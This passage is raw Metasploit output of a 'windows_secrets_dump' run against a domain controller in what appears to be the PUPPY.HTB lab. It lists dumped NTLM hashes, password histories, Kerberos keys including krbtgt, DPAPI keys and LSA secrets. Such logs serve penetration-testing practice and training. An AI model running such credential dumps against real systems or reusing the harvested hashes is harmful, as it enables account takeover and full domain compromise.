PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
PUPPY\DC$:des-cbc-md5:35346539613131363139663862396235
PUPPY\DC$:rc4-hmac:d5047916131e6ba897f975fc5f19c8df
PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::

DPAPI_SYSTEM
dpapi_machinekey: 0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
dpapi_userkey: 0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf

NL$KM
dd 1b a5 a0 33 e7 a0 56 1c 3f c3 f5 86 31 ba 09    |....3..V.?...1..|
1a c4 d4 6a 3c 2a fa 15 26 06 3b 93 e0 66 0f 7a    |...j<*..&.;..f.z|
02 9a c7 2e 52 79 c1 57 d9 0c d3 f6 17 79 ef 3f    |....Ry.W.....y.?|
75 88 a3 99 c7 e0 2b 27 56 95 5c 6b 85 81 d0 ed    |u.....+'V.\k....|
Hex string: dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed

[*] 10.10.11.70:445 - Decrypting NL$KM
[*] 10.10.11.70:445 - Dumping cached hashes
No cached hashes on this system
[*] 10.10.11.70:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 10.10.11.70:445 - Using the DRSUAPI method to get NTDS.DIT secrets
[*] 10.10.11.70:445 - SID enumeration progress -  0 / 10 ( 0.00%)
[*] 10.10.11.70:445 - SID enumeration progress - 10 / 10 (  100%)
# SID's:
Administrator: S-1-5-21-1487982659-1829050783-2281216199-500
Guest: S-1-5-21-1487982659-1829050783-2281216199-501
krbtgt: S-1-5-21-1487982659-1829050783-2281216199-502
PUPPY.HTB\levi.james: S-1-5-21-1487982659-1829050783-2281216199-1103
PUPPY.HTB\ant.edwards: S-1-5-21-1487982659-1829050783-2281216199-1104
PUPPY.HTB\adam.silver: S-1-5-21-1487982659-1829050783-2281216199-1105
PUPPY.HTB\jamie.williams: S-1-5-21-1487982659-1829050783-2281216199-1106
PUPPY.HTB\steph.cooper: S-1-5-21-1487982659-1829050783-2281216199-1107
PUPPY.HTB\steph.cooper_adm: S-1-5-21-1487982659-1829050783-2281216199-1111
DC$: S-1-5-21-1487982659-1829050783-2281216199-1000

# NTLM hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::

# Full pwdump format:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:Disabled=false,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=false,PasswordLastChanged=202502191933,LastLogonTimestamp=202507060633,IsAdministrator=true,IsDomainAdmin=true,IsEnterpriseAdmin=true::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:Disabled=true,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=true,PasswordLastChanged=never,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:Disabled=true,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202502191146,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:Disabled=false,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=false,PasswordLastChanged=202502191210,LastLogonTimestamp=202503210533,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:Disabled=false,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=false,PasswordLastChanged=202502191213,LastLogonTimestamp=202507060634,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:Disabled=true,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=false,PasswordLastChanged=202507060704,LastLogonTimestamp=202507060636,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:Disabled=false,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=false,PasswordLastChanged=202502191217,LastLogonTimestamp=202503042218,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:Disabled=false,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=false,PasswordLastChanged=202502191221,LastLogonTimestamp=202503042218,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:Disabled=false,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=false,PasswordLastChanged=202503081550,LastLogonTimestamp=202507060716,IsAdministrator=true,IsDomainAdmin=false,IsEnterpriseAdmin=false::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202505091708,LastLogonTimestamp=202507060633,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::

# Account Info:
## CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
- Administrator: true
- Domain Admin: true
- Enterprise Admin: true
- Password last changed: 2025-02-19 19:33:28 UTC
- Last logon: 2025-07-06 06:33:34 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: false
## CN=Guest,CN=Users,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: never
- Last logon: never
- Account disabled: true
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: true
## CN=krbtgt,CN=Users,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-02-19 11:46:15 UTC
- Last logon: never
- Account disabled: true
- Computer account: false
- Expired: false
- Password never expires: false
- Password not required: false
## CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-02-19 12:10:56 UTC
- Last logon: 2025-03-21 05:33:16 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: false
## CN=Anthony J. Edwards,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-02-19 12:13:14 UTC
- Last logon: 2025-07-06 06:34:20 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: false
## CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-07-06 07:04:29 UTC
- Last logon: 2025-07-06 06:36:00 UTC
- Account disabled: true
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: false
## CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-02-19 12:17:26 UTC
- Last logon: 2025-03-04 22:18:05 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: false
## CN=Stephen W. Cooper,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-02-19 12:21:00 UTC
- Last logon: 2025-03-04 22:18:05 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: false
## CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
- Administrator: true
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-03-08 15:50:40 UTC
- Last logon: 2025-07-06 07:16:30 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: false
## CN=DC,OU=Domain Controllers,DC=PUPPY,DC=HTB
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2025-05-09 17:08:45 UTC
- Last logon: 2025-07-06 06:33:30 UTC
- Account disabled: false
- Computer account: true
- Expired: false
- Password never expires: false
- Password not required: false

# Password history (pwdump format - uid:rid:lmhash:nthash:::):
PUPPY.HTB\adam.silver_history0:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history1:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history2:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history3:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history4:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history5:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history6:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history7:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history8:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history9:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history10:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history11:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history12:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history13:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history14:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history15:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history16:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history17:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history18:1105:aad3b435b51404eeaad3b435b51404ee:32b272cc73a1848ee9ba1ae23bae15d5:::
PUPPY.HTB\adam.silver_history19:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history20:1105:aad3b435b51404eeaad3b435b51404ee:32b272cc73a1848ee9ba1ae23bae15d5:::
PUPPY.HTB\adam.silver_history21:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history22:1105:aad3b435b51404eeaad3b435b51404ee:32b272cc73a1848ee9ba1ae23bae15d5:::
DC$_history0:1000:aad3b435b51404eeaad3b435b51404ee:b362347021b5ad285f1d45c6634a50e2:::
DC$_history1:1000:aad3b435b51404eeaad3b435b51404ee:065e4e2a2142eea59f95560305de4401:::

# Kerberos keys:
Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
Administrator:des-cbc-md5:20b9e03d6720150d
krbtgt:aes256-cts-hmac-sha1-96:f2443b54aed754917fd1ec5717483d3423849b252599e59b95dfdcc92c40fa45
krbtgt:aes128-cts-hmac-sha1-96:60aab26300cc6610a05389181e034851
krbtgt:des-cbc-md5:5876d051f78faeba
PUPPY.HTB\levi.james:aes256-cts-hmac-sha1-96:2aad43325912bdca0c831d3878f399959f7101bcbc411ce204c37d585a6417ec
PUPPY.HTB\levi.james:aes128-cts-hmac-sha1-96:661e02379737be19b5dfbe50d91c4d2f
PUPPY.HTB\levi.james:des-cbc-md5:efa8c2feb5cb6da8
PUPPY.HTB\ant.edwards:aes256-cts-hmac-sha1-96:107f81d00866d69d0ce9fd16925616f6e5389984190191e9cac127e19f9b70fc
PUPPY.HTB\ant.edwards:aes128-cts-hmac-sha1-96:a13be6182dc211e18e4c3d658a872182
PUPPY.HTB\ant.edwards:des-cbc-md5:835826ef57bafbc8
PUPPY.HTB\adam.silver:aes256-cts-hmac-sha1-96:670a9fa0ec042b57b354f0898b3c48a7c79a46cde51c1b3bce9afab118e569e6
PUPPY.HTB\adam.silver:aes128-cts-hmac-sha1-96:5d2351baba71061f5a43951462ffe726
PUPPY.HTB\adam.silver:des-cbc-md5:643d0ba43d54025e
PUPPY.HTB\jamie.williams:aes256-cts-hmac-sha1-96:aeddbae75942e03ac9bfe92a05350718b251924e33c3f59fdc183e5a175f5fb2
PUPPY.HTB\jamie.williams:aes128-cts-hmac-sha1-96:d9ac02e25df9500db67a629c3e5070a4
PUPPY.HTB\jamie.williams:des-cbc-md5:cb5840dc1667b615
PUPPY.HTB\steph.cooper:aes256-cts-hmac-sha1-96:799a0ea110f0ecda2569f6237cabd54e06a748c493568f4940f4c1790a11a6aa
PUPPY.HTB\steph.cooper:aes128-cts-hmac-sha1-96:cdd9ceb5fcd1696ba523306f41a7b93e
PUPPY.HTB\steph.cooper:des-cbc-md5:d35dfda40d38529b
PUPPY.HTB\steph.cooper_adm:aes256-cts-hmac-sha1-96:a3b657486c089233675e53e7e498c213dc5872d79468fff14f9481eccfc05ad9
PUPPY.HTB\steph.cooper_adm:aes128-cts-hmac-sha1-96:c23de8b49b6de2fc5496361e4048cf62
PUPPY.HTB\steph.cooper_adm:des-cbc-md5:6231015d381ab691
DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
DC$:des-cbc-md5:7f044607a8dc9710

# Clear text passwords:
[*] 10.10.11.70:445 - Cleaning up...
[*] 10.10.11.70:445 - Stopping service RemoteRegistry...
[*] Auxiliary module execution completed
msf6 auxiliary(gather/windows_secrets_dump) > 
```

